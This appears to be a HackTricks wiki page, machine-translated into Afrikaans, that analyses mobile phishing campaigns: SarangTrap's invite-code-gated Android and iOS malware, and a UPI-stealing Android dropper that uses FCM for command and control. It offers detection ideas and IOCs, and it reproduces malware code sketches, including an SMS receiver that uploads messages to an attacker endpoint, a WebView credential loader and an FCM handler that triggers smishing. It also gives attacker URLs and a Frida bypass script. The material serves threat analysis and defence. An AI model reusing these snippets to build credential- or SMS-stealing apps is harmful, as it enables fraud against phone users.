# Mobiele Phishing & Kwaadwillige App Verspreiding (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat deur bedreigingsakteurs gebruik word om **kwaadwillige Android APK's** en **iOS mobiele konfigurasieprofiele** deur phishing (SEO, sosiale ingenieurswese, vals winkels, dating-apps, ens.) te versprei.
> Die materiaal is aangepas van die SarangTrap veldtog wat deur Zimperium zLabs (2025) blootgestel is en ander openbare navorsing.

## Aanvalstroom

1. **SEO/Phishing Infrastruktuur**
* Registreer dosyne soortgelyke domeine (dating, wolk deel, motor diens…).
– Gebruik plaaslike taal sleutelwoorde en emojis in die `<title>` element om in Google te rangskik.
– Gasheer *beide* Android (`.apk`) en iOS installasie instruksies op dieselfde landing bladsy.
2. **Eerste Fase Aflaai**
* Android: direkte skakel na 'n *ongetekende* of “derdeparty winkel” APK.
* iOS: `itms-services://` of gewone HTTPS skakel na 'n kwaadwillige **mobileconfig** profiel (sien hieronder).
3. **Post-install Sosiale Ingenieurswese**
* By die eerste keer wat die app oopgemaak word, vra dit vir 'n **uitnodiging / verifikasiekode** (exclusiewe toegang illusie).
* Die kode word **POSTed oor HTTP** na die Command-and-Control (C2).
* C2 antwoord `{"success":true}` ➜ malware gaan voort.
* Sandbox / AV dinamiese analise wat nooit 'n geldige kode indien nie, sien **geen kwaadwillige gedrag** (ontwyking).
4. **Runtime Toestemming Misbruik** (Android)
* Gevaarlike toestemmings word slegs aangevra **na positiewe C2 antwoord**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Ou weergawe het ook vir SMS toestemmings gevra -->
```
* Onlangse variasies **verwyder `<uses-permission>` vir SMS uit `AndroidManifest.xml`** maar laat die Java/Kotlin kodepad wat SMS deur refleksie lees ⇒ verlaag statiese telling terwyl dit steeds funksioneel is op toestelle wat die toestemming via `AppOps` misbruik of ou teikens.
5. **Fasade UI & Agtergrond Versameling**
* App wys onskadelike uitsigte (SMS kyker, galery kieser) wat plaaslik geïmplementeer is.
* Intussen eksfiltreer dit:
- IMEI / IMSI, telefoonnommer
- Volledige `ContactsContract` dump (JSON array)
- JPEG/PNG van `/sdcard/DCIM` gecomprimeer met [Luban](https://github.com/Curzibn/Luban) om grootte te verminder
- Opsionele SMS inhoud (`content://sms`)
Payloads word **batch-gezipped** en gestuur via `HTTP POST /upload.php`.
6. **iOS Aflewering Tegniek**
* 'n Enkele **mobile-configuration profiel** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ens. vra om die toestel in “MDM”-agtige toesig in te skryf.
* Sosiale ingenieurswese instruksies:
1. Open Instellings ➜ *Profiel afgelaai*.
2. Tik *Installeer* drie keer (skermskote op die phishing bladsy).
3. Vertrou die ongetekende profiel ➜ aanvaller verkry *Kontakte* & *Foto* regte sonder App Store hersiening.
7. **Netwerk Laag**
* Gewone HTTP, dikwels op poort 80 met HOST kop soos `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om op te spoor).

## Verdedigende Toetsing / Rooi Span Wenke

* **Dinamiese Analise Ontwyking** – Tydens malware evaluasie, outomatiseer die uitnodigingskode fase met Frida/Objection om die kwaadwillige tak te bereik.
* **Manifest vs. Runtime Verskil** – Vergelyk `aapt dump permissions` met runtime `PackageManager#getRequestedPermissions()`; ontbrekende gevaarlike perms is 'n rooi vlag.
* **Netwerk Kanarie** – Konfigureer `iptables -p tcp --dport 80 -j NFQUEUE` om onsamehangende POST uitbarstings na kode invoer te detecteer.
* **mobileconfig Inspeksie** – Gebruik `security cms -D -i profile.mobileconfig` op macOS om `PayloadContent` te lys en oortollige regte op te spoor.

## Blou Span Opsporing Idees

* **Sertifikaat Deursigtigheid / DNS Analise** om skielike uitbarstings van sleutelwoord-ryke domeine te vang.
* **User-Agent & Pad Regex**: `(?i)POST\s+/(check|upload)\.php` van Dalvik kliënte buite Google Play.
* **Uitnodigingskode Telemetrie** – POST van 6–8 syfer numeriese kodes kort nadat APK geïnstalleer is, kan staging aandui.
* **MobileConfig Ondertekening** – Blokkeer ongetekende konfigurasieprofiele via MDM beleid.

## Nuttige Frida Snippet: Outo-Ontwyking Uitnodigingskode
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Aanduiders (Generies)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Betaling Phishing (UPI) – Dropper + FCM C2 Patroon

Hierdie patroon is waargeneem in veldtogte wat regeringsvoordele tematies misbruik om Indiese UPI-akkredite en OTP's te steel. Operateurs ketting betroubare platforms vir aflewering en veerkragtigheid.

### Afleweringsketting oor betroubare platforms
- YouTube video lokmiddel → beskrywing bevat 'n kort skakel
- Kortskakel → GitHub Pages phishing-webwerf wat die regte portaal naboots
- Dieselfde GitHub-repo huisves 'n APK met 'n vals “Google Play” badge wat direk na die lêer skakel
- Dinamiese phishing-bladsye leef op Replit; afstandsopdragkanaal gebruik Firebase Cloud Messaging (FCM)

### Dropper met ingebedde payload en aflyn installasie
- Eerste APK is 'n installeerder (dropper) wat die werklike malware by `assets/app.apk` verskaf en die gebruiker vra om Wi‑Fi/mobiele data te deaktiveer om wolkdetectie te verminder.
- Die ingebedde payload installeer onder 'n onskuldige etiket (bv., “Veilige Opdatering”). Na installasie is beide die installeerder en die payload teenwoordig as aparte toepassings.

Statiese triage wenk (grep vir ingebedde payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamiese eindpuntontdekking via kortskakel
- Malware haal 'n plain-text, komma-geskeide lys van lewende eindpunte van 'n kortskakel; eenvoudige stringtransformasies produseer die finale phishing-bladsy-pad.

Voorbeeld (gesaniteer):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-kode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-gebaseerde UPI geloofsbriefinsameling
- Die “Maak betaling van ₹1 / UPI‑Lite” stap laai 'n aanvaller HTML-vorm vanaf die dinamiese eindpunt binne 'n WebView en vang sensitiewe velde (telefoon, bank, UPI PIN) wat `POST` na `addup.php` gestuur word.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagasie en SMS/OTP onderskepping
- Agressiewe toestemmings word op die eerste uitvoering aangevra:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte word in 'n lus geplaas om massavereiste smishing SMS vanaf die slagoffer se toestel te stuur.
- Inkomende SMS's word deur 'n uitsaaier ontvang en met metadata (afsender, inhoud, SIM-slot, per-toestel ewekansige ID) na `/addsm.php` opgelaai.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- Die payload registreer by FCM; stootboodskappe dra 'n `_type` veld wat as 'n skakel gebruik word om aksies te aktiveer (bv., werk phishing teks sjablone op, skakel gedrag).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler skets:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Jagpatrone en IOCs
- APK bevat sekondêre las op `assets/app.apk`
- WebView laai betaling van `gate.htm` en eksfiltreer na `/addup.php`
- SMS eksfiltrasie na `/addsm.php`
- Kortskakel-gedrewe konfigurasie opvraging (bv. `rebrand.ly/*`) wat CSV eindpunte teruggee
- Apps geëtiketteer as generiese “Opdatering/Sekere Opdatering”
- FCM `data` boodskappe met 'n `_type` diskrimineerder in onbetroubare apps

### Opsporing & verdediging idees
- Merk apps wat gebruikers instrueer om netwerk tydens installasie te deaktiveer en dan 'n tweede APK van `assets/` sy-laden.
- Laat weet oor die toestemming tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-gebaseerde betalingsvloei.
- Egress monitering vir `POST /addup.php|/addsm.php` op nie-korporatiewe gasheer; blokkeer bekende infrastruktuur.
- Mobiele EDR reëls: onbetroubare app wat registreer vir FCM en tak op 'n `_type` veld.

---

## Verwysings

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
